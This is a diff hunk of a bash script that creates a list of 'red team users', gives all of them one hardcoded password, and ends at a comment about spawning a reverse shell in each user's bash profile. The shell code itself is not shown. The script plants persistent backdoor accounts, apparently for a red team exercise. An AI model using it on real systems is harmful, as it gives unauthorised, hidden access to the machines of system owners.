@@ -4,7 +4,12 @@ usernames=("caroline" "denna" "kvothe" "bast" "auri" "ambrose" "elodin" "fela")
 
 for username in "${usernames[@]}"; do
     # Create red team users
-    id "$username" &>/dev/null || useradd -m "$username"
+    if id "$username" &>/dev/null; then
+        echo "User $username already exists, skipping creation."
+    else
+        useradd -m -s /bin/bash "$username"
+        echo "User $username created."
+    fi
     # Set passwords for red team users
     echo "$username:aTerg0Lupi!" | chpasswd
     # Spawn reverse shell in each user's bash profile
